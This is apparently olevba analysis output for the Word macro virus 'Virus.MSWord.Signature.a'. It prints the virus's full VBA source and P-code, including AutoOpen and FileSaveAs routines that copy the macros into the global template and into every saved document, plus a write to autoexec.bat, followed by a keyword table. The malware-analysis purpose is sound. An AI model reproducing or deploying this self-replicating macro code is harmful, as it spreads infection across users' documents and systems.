olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Signature.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Signature.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Signature.a - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Copies the virus from NORMAL.DOT onto every document saved using SaveAs."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim CurrentFile$
Dim CopyParameter$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
CurrentFile$ = WordBasic.[FileName$]()
CopyParameter$ = CurrentFile$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileSaveAs", CopyParameter$
CopyParameter$ = CurrentFile$ + ":Signature"
WordBasic.MacroCopy "Global:Signature", CopyParameter$
CopyParameter$ = CurrentFile$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", CopyParameter$
WordBasic.FileSaveAs dlg    'This line is part of the Word default
End Sub
-------------------------------------------------------------------------------
VBA MACRO Signature.bas 
in file: Virus.MSWord.Signature.a - OLE stream: 'Macros/VBA/Signature'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "The virus signature file.\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Signature.MAIN"

    Rem Chris' Word macro virus signature file.

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Signature.a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Automatically executes when the file is opened and installs the macro virus."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim Title$
Dim TotalMacros
Dim CurrentMacro
Dim AlreadyInstalled
Dim Install
Dim CurrentFile$
Dim CopyParameter$
Dim name_$

On Error GoTo -1: On Error GoTo Finish
Title$ = "HELL for Windows"
TotalMacros = WordBasic.CountMacros(0)
For CurrentMacro = 1 To TotalMacros
    If WordBasic.[MacroName$](CurrentMacro) = "Signature" Then
        AlreadyInstalled = -1
    End If
Next CurrentMacro
If AlreadyInstalled Then
End If
If Not AlreadyInstalled Then
Install = 1
If Install Then
    CurrentFile$ = WordBasic.[FileName$]()  'Put current filename into Currentfile$
    CopyParameter$ = CurrentFile$ + ":AutoOpen" 'Make #1 arg for MacroCp
    WordBasic.MacroCopy CopyParameter$, "Global:AutoOpen"   'in MacroCopy command
    CopyParameter$ = CurrentFile$ + ":Signature"
    WordBasic.MacroCopy CopyParameter$, "Global:Signature"
    CopyParameter$ = CurrentFile$ + ":FileSaveAs"
    WordBasic.MacroCopy CopyParameter$, "Global:FileSaveAs"
End If
End If
name_$ = "c:\autoexec.bat"
Open name_$ For Append As 1
Print #1, "WIN"
Close 1
Finish:

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Signature.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSaveAs - 2166 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn CurrentFile
' Line #3:
' 	Dim 
' 	VarDefn CopyParameter
' Line #4:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #5:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St CurrentFile$ 
' Line #9:
' 	Ld CurrentFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St CopyParameter$ 
' Line #10:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld CopyParameter$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	Ld CurrentFile$ 
' 	LitStr 0x000A ":Signature"
' 	Add 
' 	St CopyParameter$ 
' Line #12:
' 	LitStr 0x0010 "Global:Signature"
' 	Ld CopyParameter$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld CurrentFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St CopyParameter$ 
' Line #14:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld CopyParameter$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	QuoteRem 0x001C 0x0025 "This line is part of the Word default"
' Line #16:
' 	EndSub 
' Macros/VBA/Signature - 1240 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' Line #3:
' 	Rem 0x0028 " Chris' Word macro virus signature file."
' Line #4:
' Line #5:
' 	EndSub 
' Macros/VBA/AutoOpen - 3488 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Title
' Line #3:
' 	Dim 
' 	VarDefn TotalMacros
' Line #4:
' 	Dim 
' 	VarDefn CurrentMacro
' Line #5:
' 	Dim 
' 	VarDefn AlreadyInstalled
' Line #6:
' 	Dim 
' 	VarDefn Install
' Line #7:
' 	Dim 
' 	VarDefn CurrentFile
' Line #8:
' 	Dim 
' 	VarDefn CopyParameter
' Line #9:
' 	Dim 
' 	VarDefn name_
' Line #10:
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Finish 
' Line #12:
' 	LitStr 0x0010 "HELL for Windows"
' 	St Title$ 
' Line #13:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St TotalMacros 
' Line #14:
' 	StartForVariable 
' 	Ld CurrentMacro 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TotalMacros 
' 	For 
' Line #15:
' 	Ld CurrentMacro 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	LitStr 0x0009 "Signature"
' 	Eq 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	UMi 
' 	St AlreadyInstalled 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	StartForVariable 
' 	Ld CurrentMacro 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	Ld AlreadyInstalled 
' 	IfBlock 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld AlreadyInstalled 
' 	Not 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	St Install 
' Line #23:
' 	Ld Install 
' 	IfBlock 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St CurrentFile$ 
' 	QuoteRem 0x002C 0x0026 "Put current filename into Currentfile$"
' Line #25:
' 	Ld CurrentFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St CopyParameter$ 
' 	QuoteRem 0x0030 0x0017 "Make #1 arg for MacroCp"
' Line #26:
' 	Ld CopyParameter$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' 	QuoteRem 0x003C 0x0014 "in MacroCopy command"
' Line #27:
' 	Ld CurrentFile$ 
' 	LitStr 0x000A ":Signature"
' 	Add 
' 	St CopyParameter$ 
' Line #28:
' 	Ld CopyParameter$ 
' 	LitStr 0x0010 "Global:Signature"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #29:
' 	Ld CurrentFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St CopyParameter$ 
' Line #30:
' 	Ld CopyParameter$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St name_$ 
' Line #34:
' 	Ld name_$ 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Append)
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "WIN"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #37:
' 	Label Finish 
' Line #38:
' Line #39:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

